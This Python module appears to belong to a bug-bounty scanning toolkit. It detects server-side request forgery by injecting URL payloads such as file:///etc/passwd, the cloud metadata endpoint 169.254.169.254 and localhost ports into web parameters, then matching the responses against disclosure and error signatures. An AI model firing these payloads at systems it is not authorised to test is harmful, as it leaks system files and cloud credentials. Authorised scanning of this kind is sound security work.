#!/usr/bin/env python3
"""
ssrf.py — Server-Side Request Forgery detection (P2)
====================================================
Sends URL values into parameters and looks for three signals:
  1. Local/cloud-metadata disclosure via ``file://`` or ``http://169.254...``
     (leaked content in the response -> HIGH/confirmed).
  2. Connection error signatures ("could not connect", "Connection refused",
     "failed to open stream") that reveal the server fetched our URL
     (MEDIUM/probable).
  3. Optional OOB reflection: if ``BBTK_OOB_HOST`` is set, send
     ``http://<oob>/<marker>`` and flag if the marker is echoed back
     (requires the server to reflect the fetched body).

Pure checkers are unit-testable; only ``test_endpoint``/``run_ssrf`` do I/O.
"""
from __future__ import annotations

import asyncio
import os
from dataclasses import dataclass
from typing import Any

try:
    from toolkit.infra.finding import NormalizedFinding
    _HAVE_FINDING = True
except Exception:  # pragma: no cover
    _HAVE_FINDING = False


_ERROR_SIGS = ["could not connect", "connection refused", "failed to open stream",
               "couldn't resolve host", "name or service not known",
               "operation timed out", "no route to host", "stream_socket_client",
               "getaddrinfo", "failed to open", "curl error", "fsockopen"]
_DISCLOSURE = ["root:x:0:0:", "instance-id", "ami-id", "latest/meta-data",
               "<?xml", "network/interfaces"]


def _detect_ssrf(text: str) -> str:
    low = (text or "").lower()
    for s in _DISCLOSURE:
        if s.lower() in low:
            return "disclosure:" + s
    for s in _ERROR_SIGS:
        if s in low:
            return "error:" + s
    return ""


def _oob_payload() -> str | None:
    host = os.environ.get("BBTK_OOB_HOST")
    if not host:
        return None
    return f"http://{host}/bbtkssrf"


@dataclass
class SsrfFinding:
    url: str
    method: str
    param: str
    technique: str
    payload: str
    evidence: str = ""

    def to_dict(self) -> dict:
        return self.__dict__.copy()


async def _send(client, endpoint: Any, param: str, value: str, *,
                timeout: float = 10.0) -> str:
    via = getattr(endpoint, "inject_via", "query")
    headers = {"User-Agent": "Mozilla/5.0 (compatible; BBTK-ssrf/1.0)"}
    try:
        if via == "body_form":
            r = await client.request(endpoint.method, endpoint.url, headers=headers,
                                     data={param: value}, timeout=timeout)
        elif via == "body_json":
            r = await client.request(endpoint.method, endpoint.url,
                                     headers={**headers, "Content-Type": "application/json"},
                                     json={param: value}, timeout=timeout)
        else:
            from toolkit.infra import inject
            full = inject.build_injection_url(endpoint.url, param, value)
            r = await client.request(endpoint.method, full, headers=headers, timeout=timeout)
        return getattr(r, "text", "") or ""
    except Exception:
        return ""


async def test_endpoint(endpoint: Any, client: object, *,
                        timeout: float = 10.0) -> list[SsrfFinding]:
    params = list(getattr(endpoint, "params", []) or [])
    if not params:
        return []
    out: list[SsrfFinding] = []
    seen: set[str] = set()
    payloads = [
        "file:///etc/passwd",
        "http://169.254.169.254/latest/meta-data/",
        "http://localhost:80/",
        "http://127.0.0.1:22/",
    ]
    oob = _oob_payload()
    if oob:
        payloads.append(oob)
    for param in params:
        chosen: "SsrfFinding | None" = None
        for p in payloads:
            body = await _send(client, endpoint, param, p, timeout=timeout)
            sig = _detect_ssrf(body)
            if not sig:
                continue
            tech = "disclosure" if sig.startswith("disclosure") else "error"
            cand = SsrfFinding(endpoint.url, endpoint.method, param, tech, p,
                              f"SSRF signal '{sig}'")
            if tech == "disclosure":
                chosen = cand
                break  # disclosure is the strongest signal; stop here
            if chosen is None:
                chosen = cand
        if chosen is not None and (param, chosen.technique) not in seen:
            seen.add((param, chosen.technique))
            out.append(chosen)
    return out


async def run_ssrf(endpoints: list[Any], client: object, *,
                  timeout: float = 10.0, concurrency: int = 10) -> list[SsrfFinding]:
    sem = asyncio.Semaphore(concurrency)

    async def guarded(ep):
        async with sem:
            return await test_endpoint(ep, client, timeout=timeout)
    results = await asyncio.gather(*[guarded(ep) for ep in endpoints])
    return [f for sub in results for f in sub]


def to_normalized_findings(findings: list[SsrfFinding],
                           source_tool: str = "ssrf.py") -> list[dict]:
    out: list[dict] = []
    for f in findings:
        sev = "HIGH" if f.technique == "disclosure" else "MEDIUM"
        detail = (f"Server-Side Request Forgery via parameter '{f.param}' "
                  f"({f.method} {f.url}) — {f.evidence}")
        if _HAVE_FINDING:
            nf = NormalizedFinding(source_tool=source_tool, host=_host(f.url), url=f.url,
                                   vuln_class_key="SSRF", severity=sev,
                                   title=f"SSRF in {f.param}",
                                   detail=detail, evidence=f"payload={f.payload}",
                                   confidence="confirmed" if f.technique == "disclosure" else "probable")
            d = nf.to_dict()
            d["param"] = f.param
        else:
            d = {"source_tool": source_tool, "host": _host(f.url), "url": f.url,
                 "param": f.param, "vuln_class_key": "SSRF", "severity": sev,
                 "title": f"SSRF in {f.param}", "detail": detail,
                 "evidence": f.payload,
                 "confidence": "confirmed" if f.technique == "disclosure" else "probable"}
        out.append(d)
    return out


def _host(url: str) -> str:
    from urllib.parse import urlparse
    return urlparse(url).netloc
